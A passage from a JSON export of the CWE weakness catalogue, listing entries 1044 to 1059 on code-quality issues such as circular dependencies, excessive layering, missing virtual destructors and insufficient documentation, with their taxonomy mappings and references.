      "ExtendedDescription": "\n\nThis issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n\n\nWhile the interpretation of \"excessively large\" may vary for each product or developer, CISQ recommends a default of 5 sub-elements.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1093",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Performance"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCPEM",
          "EntryID": "ASCPEM-PRF-12"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-959",
          "Section": "ASCPEM-PRF-12",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Performance Efficiency Measure (ASCPEM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCPEM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1044",
      "Name": "Architecture with Number of Horizontal Layers Outside of Expected Range",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product's architecture contains too many - or too few -\n\t\t\t\t\thorizontal layers.",
      "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n\n\nWhile the interpretation of \"expected range\" may vary for each product or developer, CISQ recommends a default minimum of 4 layers and maximum of 8 layers.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "710",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Maintainability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCMM",
          "EntryID": "ASCMM-MNT-9"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-960",
          "Section": "ASCMM-MNT-9",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Maintainability Measure (ASCMM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCMM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1045",
      "Name": "Parent Class with a Virtual Destructor and a Child Class without a Virtual Destructor",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "A parent class has a virtual destructor method, but the parent has a child class that does not have a virtual destructor.",
      "ExtendedDescription": "\n\nThis issue can prevent the product from running reliably, since the child might not perform essential destruction operations. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability, such as a memory leak (CWE-401).\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1076",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Reliability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCRM",
          "EntryID": "ASCRM-RLB-17"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-961",
          "Section": "ASCRM-RLB-17",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Reliability Measure (ASCRM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCRM/1.0/"
        },
        {
          "ExternalReferenceID": "REF-977",
          "Authors": [
            "QuantStart"
          ],
          "Title": "C++ Virtual Destructors: How to Avoid Memory Leaks",
          "URL": "https://www.quantstart.com/articles/C-Virtual-Destructors-How-to-Avoid-Memory-Leaks/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-978",
          "Authors": [
            "GeeksforGeeks"
          ],
          "Title": "Virtual Destructor",
          "URL": "https://www.geeksforgeeks.org/virtual-destructor/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "1046",
      "Name": "Creation of Immutable Text Using String Concatenation",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product creates an immutable text string using string concatenation operations.",
      "ExtendedDescription": "\n\nWhen building a string via a looping feature (e.g., a FOR or WHILE loop), the use of += to append to the existing string will result in the creation of a new object with each iteration. This programming pattern can be inefficient in comparison with use of text buffer data elements. This issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this could be influenced to create performance problem.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1176",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Performance"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCPEM",
          "EntryID": "ASCPEM-PRF-2"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-959",
          "Section": "ASCPEM-PRF-2",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Performance Efficiency Measure (ASCPEM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCPEM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "1047",
      "Name": "Modules with Circular Dependencies",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product contains modules in which one module has references that cycle back to itself, i.e., there are circular dependencies.",
      "ExtendedDescription": "\n\nAs an example, with Java, this weakness might indicate cycles between packages.\n\n\nThis issue makes it more difficult to maintain the product due to insufficient modularity, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n\n\nThis issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1120",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Reliability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCMM",
          "EntryID": "ASCMM-MNT-7"
        },
        {
          "TaxonomyName": "OMG ASCRM",
          "EntryID": "ASCRM-RLB-13"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-960",
          "Section": "ASCMM-MNT-7",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Maintainability Measure (ASCMM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCMM/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-961",
          "Section": "ASCRM-RLB-13",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Reliability Measure (ASCRM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCRM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1048",
      "Name": "Invokable Control Element with Large Number of Outward Calls",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The code contains callable control elements that\n         contain an excessively large number of references to other\n         application objects external to the context of the callable,\n         i.e. a Fan-Out value that is excessively large.",
      "ExtendedDescription": "\n\nWhile the interpretation of \"excessively large Fan-Out value\" may vary for each product or developer, CISQ recommends a default of 5 referenced objects.\n\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "710",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Maintainability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCMM",
          "EntryID": "ASCMM-MNT-4"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-960",
          "Section": "ASCMM-MNT-4",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Maintainability Measure (ASCMM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCMM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1049",
      "Name": "Excessive Data Query Operations in a Large Data Table",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product performs a data query with a large number of joins\n\t\t\t\t\tand sub-queries on a large data table.",
      "ExtendedDescription": "\n\nThis issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n\n\nWhile the interpretation of \"large data table\" and \"large number of joins or sub-queries\" may vary for each product or developer, CISQ recommends a default of 1 million rows for a \"large\" data table, a default minimum of 5 joins, and a default minimum of 3 sub-queries.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1176",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Performance"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCPEM",
          "EntryID": "ASCPEM-PRF-4"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-959",
          "Section": "ASCPEM-PRF-4",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Performance Efficiency Measure (ASCPEM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCPEM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "1050",
      "Name": "Excessive Platform Resource Consumption within a Loop",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product has a loop body or loop condition that contains a control element that directly or\n\t\t\t\t\tindirectly consumes platform resources, e.g. messaging, sessions, locks, or file\n\t\t\t\t\tdescriptors.",
      "ExtendedDescription": "\n\nThis issue can make the product perform more slowly. If an attacker can influence the number of iterations in the loop, then this performance problem might allow a denial of service by consuming more platform resources than intended.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "405",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Performance"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCPEM",
          "EntryID": "ASCPEM-PRF-8"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-959",
          "Section": "ASCPEM-PRF-8",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Performance Efficiency Measure (ASCPEM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCPEM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "1051",
      "Name": "Initialization with Hard-Coded Network Resource Configuration Data",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product initializes data using hard-coded values that act as network resource identifiers.",
      "ExtendedDescription": "\n\nThis issue can prevent the product from running reliably, e.g. if it runs in an environment does not use the hard-coded network resource identifiers. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1419",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Reliability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCRM",
          "EntryID": "ASCRM-RLB-18"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-961",
          "Section": "ASCRM-RLB-18",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Reliability Measure (ASCRM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCRM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1052",
      "Name": "Excessive Use of Hard-Coded Literals in Initialization",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product initializes a data element using a hard-coded\n\t\t\t\t\tliteral that is not a simple integer or static constant element.",
      "ExtendedDescription": "\n\nThis issue makes it more difficult to modify or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1419",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Maintainability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCMM",
          "EntryID": "ASCMM-MNT-3"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-960",
          "Section": "ASCMM-MNT-3",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Maintainability Measure (ASCMM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCMM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "1053",
      "Name": "Missing Documentation for Design",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product does not have documentation that represents how it is designed.",
      "ExtendedDescription": "\n\nThis issue can make it more difficult to understand and maintain the product. It can make it more difficult and time-consuming to detect and/or fix vulnerabilities.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1059",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-963",
          "Authors": [
            "Robert A. Martin",
            "Lawrence H. Shafer"
          ],
          "Title": "Providing a Framework for Effective Software Quality Assessment",
          "PublicationYear": "1996",
          "PublicationMonth": "07",
          "URL": "https://www.researchgate.net/publication/285403022_PROVIDING_A_FRAMEWORK_FOR_EFFECTIVE_SOFTWARE_QUALITY_MEASUREMENT_MAKING_A_SCIENCE_OF_RISK_ASSESSMENT",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1054",
      "Name": "Invocation of a Control Element at an Unnecessarily Deep Horizontal Layer",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The code at one architectural layer invokes code that resides\n\t\t\t\t\tat a deeper layer than the adjacent layer, i.e., the invocation skips at least one\n\t\t\t\t\tlayer, and the invoked code is not part of a vertical utility layer that can be referenced from any horizontal layer.",
      "ExtendedDescription": "\n\nThis issue makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1061",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Maintainability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCMM",
          "EntryID": "ASCMM-MNT-12"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-960",
          "Section": "ASCMM-MNT-12",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Maintainability Measure (ASCMM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCMM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1055",
      "Name": "Multiple Inheritance from Concrete Classes",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product contains a class with inheritance from more than\n\t\t\t\t\tone concrete class.",
      "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1093",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Maintainability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCMM",
          "EntryID": "ASCMM-MNT-2"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-960",
          "Section": "ASCMM-MNT-2",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Maintainability Measure (ASCMM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCMM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1056",
      "Name": "Invokable Control Element with Variadic Parameters",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "A named-callable or method control element has a signature that\n\t\t\t\t\tsupports a variable (variadic) number of parameters or arguments.",
      "ExtendedDescription": "\n\nThis issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n\n\nWith variadic arguments, it can be difficult or inefficient for manual analysis to be certain of which function/method is being invoked.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1120",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Reliability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCRM",
          "EntryID": "ASCRM-RLB-8"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-961",
          "Section": "ASCRM-RLB-8",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Reliability Measure (ASCRM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCRM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1057",
      "Name": "Data Access Operations Outside of Expected Data Manager Component",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses a dedicated, central data manager component as required by design, but it contains code that performs data-access operations that do not use this data manager.",
      "ExtendedDescription": "\n\nThis issue can make the product perform more slowly than intended, since the intended central data manager may have been explicitly optimized for performance or other quality characteristics. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1061",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Performance"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCPEM",
          "EntryID": "ASCPEM-PRF-11"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-959",
          "Section": "ASCPEM-PRF-11",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Performance Efficiency Measure (ASCPEM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCPEM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1058",
      "Name": "Invokable Control Element in Multi-Thread Context with non-Final Static Storable or Member Element",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The code contains a function or method that\n\t\t operates in a multi-threaded environment but owns an unsafe non-final\n\t\t                     static storable or member data element.",
      "ExtendedDescription": "\n\nThis issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "662",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "662",
          "ViewID": "1305",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "662",
          "ViewID": "1340",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Reliability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCRM",
          "EntryID": "ASCRM-RLB-11"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-961",
          "Section": "ASCRM-RLB-11",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Reliability Measure (ASCRM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCRM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "1059",
      "Name": "Insufficient Technical Documentation",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product does not contain sufficient\n         technical or engineering documentation (whether on paper or\n         in electronic form) that contains descriptions of all the\n         relevant software/hardware elements of the product, such as\n         its usage, structure, architectural components, interfaces, design, implementation,\n         configuration, operation, etc.",
      "ExtendedDescription": "\n\nWhen technical documentation is limited or lacking, products are more difficult to maintain. This indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.\n\n\nWhen using time-limited or labor-limited third-party/in-house security consulting services (such as threat modeling, vulnerability discovery, or pentesting), insufficient documentation can force those consultants to invest unnecessary time in learning how the product is organized, instead of focusing their expertise on finding the flaws or suggesting effective mitigations.\n\n\nWith respect to hardware design, the lack of a formal, final manufacturer reference can make it difficult or impossible to evaluate the final product, including post-manufacture verification. One cannot ensure that design functionality or operation is within acceptable tolerances, conforms to specifications, and is free from unexpected behavior. Hardware-related documentation may include engineering artifacts such as hardware description language (HDLs), netlists, Gerber files, Bills of Materials, EDA (Electronic Design Automation) tool files, etc.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "710",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Operating_System",
          "Class": "Not OS-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Architecture",
          "Class": "Not Architecture-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Not Technology-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "ICS/OT",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Documentation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Varies by Context",
            "Hide Activities",
            "Reduce Reliability",
            "Quality Degradation",
            "Reduce Maintainability"
          ],
          "Note": "Without a method of verification, one cannot be sure that everything only functions as expected."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Documentation",
            "Architecture and Design"
          ],
          "Description": "Ensure that design documentation is detailed enough to allow for post-manufacturing verification."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-3203",
          "Description": "A wireless access point manual specifies that the only method of configuration is via web interface (CWE-1059), but there is an undisclosed telnet server that was activated by default (CWE-912).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-3203"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "ISA/IEC 62443",
